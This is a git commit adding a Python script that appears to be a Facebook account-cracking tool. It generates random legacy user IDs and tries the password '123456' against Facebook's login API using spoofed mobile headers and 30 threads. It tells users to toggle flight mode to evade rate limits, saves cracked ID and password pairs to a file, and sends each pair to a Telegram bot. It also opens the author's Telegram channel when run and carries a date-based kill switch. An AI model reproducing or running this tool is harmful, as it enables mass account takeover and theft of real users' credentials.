52d7830e7d06fdb947707e53d02d4f51544aeae9
goxhamzaxff-afk <goxhamzaxff@gmail.com>
2025-09-09 22:56:14 +0100

    Add files via upload

---
+++ 𝑴𝒐𝒖𝒓𝒂𝒅 2009 ⭐.py
@@ -0,0 +1,135 @@
+import datetime
+
+now = datetime.date.today()
+target = datetime.date(2025, 12, 11)
+
+if now >= target:
+    print("تم ايقاف الاداة ارسل للمطو@M_O_U_R_A_D09 ليتفعيل مرة اخرا بتوفيق🖤🦅")
+    exit()
+    
+    
+    
+    
+    
+    
+    import time
+import datetime
+
+def run_tool():
+    
+    print("الأداة تعمل")
+
+def main():
+    start_time = time.time()
+    end_time = start_time + 3600  
+
+    while time.time() < end_time:
+        run_tool()
+        time.sleep(1)  
+        
+
+from concurrent.futures import ThreadPoolExecutor as tred
+import requests,sys
+from os import system as cmd
+from random import randint as rr
+from random import choice as rc
+from string import digits as digits
+import requests
+import os
+import re
+import sys
+import random
+import string
+import time
+from os import system as Amir
+from os import system as shell
+from rich import print
+from rich import print_json
+from rich import pretty
+from rich.progress import track
+from rich.markdown import Markdown
+from rich.tree import Tree
+from rich.panel import Panel
+from rich.padding import Padding;import webbrowser;webbrowser.open('https://t.me/MOURAD_B2M_1')
+
+
+
+
+# 
+def linex():print(Panel(f'''[bold Red]   
+𝑴𝒐𝒖𝒓𝒂𝒅 ''',style='''bold Red'''))
+linex()
+print(Panel(f'''[bold green1]    Enter Tokn ''',style='''bold magenta2'''))
+token = input(f"  TOKEN  :")
+print(Panel(f'''[bold green1]   Enter Id ''',style='''bold magenta2'''))
+ID = input(f"  ID  :")
+loop,ok=0,0
+class Amir:
+    def __init__(self) -> None:
+      self.sex=""
+    def main(self):
+ 
+       os.system("clear")
+       linex()
+       print(Panel("[cyan bold][✓] 1 𝗢𝗜𝗗 𝗖𝗜𝗢𝗡𝗘 2009  \n[red bold][✘] 2 𝗘𝗫i𝗧 𝗠𝗘𝗡𝗨",style='''bold magenta2'''))
+       self.frsc=input("\033[0;32m~>> chose : ")
+       if self.frsc == "1":self.settings()
+       else:pass
+    def settings(self):
+       os.system("clear")
+       linex()
+       print(Panel("[bold green]~>> Example : 10000   50000   1000000 ",style='''bold magenta2'''))
+       self.limit=int(input("\033[0;33m~>> Enter Search Limit : "));self.user=[]
+       for _ in range(self.limit):nmp = ''.join(rc(digits) for _ in range(9));self.user.append(nmp)
+       with tred(max_workers=30) as Amir:
+           total=str(len(self.user))
+           os.system("clear")
+           linex()
+           print("[✓] TOTAL ID : %s"%(total))
+           print('[✓] PASSWORD : 123456 + 123456789')
+           print(Panel("[bold green][✓] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE ",style='''bold green1'''))
+           print(Panel("            [yellow bold]        𝑴𝒐𝒖𝒓𝒂𝒅 ⭐ ",style='''bold green1'''))
+           for xd in self.user:
+               uid=str('100000'+xd);pas=['123456']
+               Amir.submit(self.cracker,uid,pas,total)
+     
+       print();linex();print("~>> Cracking Complete \n~>> Total OK : %s"%(ok))
+       linex();input("~>> Prees Enter To Exit ");exit()
+    def cracker(self,uid,pas,tl):
+       global loop,ok
+       sys.stdout.write("\r\r\033[0;91m~>> 𝑴𝒐𝒖𝒓𝒂𝒅 🍓⭐~>> %s ~>> OK ~>> %s \r"%(loop,ok));sys.stdout.flush()
+       try:
+          for ps in pas:
+              with requests.Session() as session:
+                 headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': self.ua(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+              po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
+              if "Please Confirm Email" in str(po):
+                 print(Panel(f"\r\r~>> OK ~>> [green bold]{uid} | [yellow bold]{ps} \033[0m"));print(Panel(f"[yellow bold] LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/Amir-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1;tlg = f'''❲ OK -𝑴𝒐𝒖𝒓𝒂𝒅  جابلك حساب ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉
+╮❲ تم الصيد حساب فيس بوك 💌 ❳
+┤❲ تاريخ الانضمام 2009+2014 ❳
+┤❲ ايدي ❳ {uid}
+┤❲ باسورد ❳ {ps}
+┤❲ المبرمج ❳ >𝑴𝒐𝒖𝒓𝒂𝒅 
+╯❲ قنواتي تيليجرام ❳ ⇣
+BY❲ https://t.me/MOURAD_B2M_1 ❳
+┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉''';requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
+                 break
+              elif "session_key" in po:
+                 print(Panel(f"\r\r~>> OK ~>>[green bold] {uid} | [yellow bold]{ps} \033[0m"));print(Panel(f"[yellow bold] LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/Amir-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1;tlg = f'''❲ OK -𝑴𝒐𝒖𝒓𝒂𝒅 جبلك حساب ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉
+╮❲ تم الصيد حساب فيس بوك 💌 ❳
+┤❲ تاريخ الانضمام 2009+2014 ❳
+┤❲ ايدي ❳ {uid}
+┤❲ باسورد ❳ {ps}
+┤❲ المبرمج ❳ >𝑴𝒐𝒖𝒓𝒂𝒅 
+╯❲ قنواتي تيليجرام ❳ ⇣
+BY❲ https://t.me/MOURAD_B2M_1 ❳
+┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉''';requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
+                 break
+              else:pass
+          loop+=1
+       except Exception as e:pass
+    def ua(self):
+       aa = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FykBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
+       return aa       
+Amir().main()
+#قناتي https://t.me/MOURAD_B2M_1
